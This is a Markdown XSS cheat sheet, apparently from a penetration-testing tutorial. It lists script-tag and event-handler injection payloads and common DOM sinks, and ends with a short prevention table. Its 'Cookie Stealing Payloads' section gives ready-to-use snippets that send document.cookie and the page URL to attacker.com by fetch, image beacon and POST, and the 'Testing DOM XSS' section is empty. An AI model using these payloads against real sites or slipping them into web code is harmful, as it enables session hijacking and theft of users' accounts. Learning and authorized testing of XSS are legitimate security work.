## Basic XSS Payloads

### Script Tag Injection

The most straightforward XSS vector — injecting a `<script>` tag:

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Event Handler Injection

When `<script>` tags are filtered, use **event handlers**:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

<Alert type="warning">
Always obtain proper authorization before testing XSS payloads on any system. Unauthorized testing is illegal and unethical.
</Alert>

## Cookie Stealing Payloads

### Basic Exfiltration

```html
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```

### Image-Based Exfiltration

```html
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```

### Fetch with POST

```html
<script>
fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href
  })
})
</script>
```

## DOM-Based XSS

### Common Sinks

```javascript
// Dangerous functions that can execute attacker input
document.write(userInput)
element.innerHTML = userInput
eval(userInput)
setTimeout(userInput, 1000)
location.href = userInput
```

### Testing DOM XSS


## Prevention Reference

| Defense | Description |
|---------|-------------|
| **Output Encoding** | Encode user data based on output context (HTML, JS, URL) |
| **CSP Headers** | `Content-Security-Policy: script-src 'self'` |
| **HttpOnly Cookies** | Prevents JavaScript access to session cookies |
| **Input Validation** | Whitelist allowed characters |
| **Sanitization Libraries** | DOMPurify for client-side, Bleach for Python |
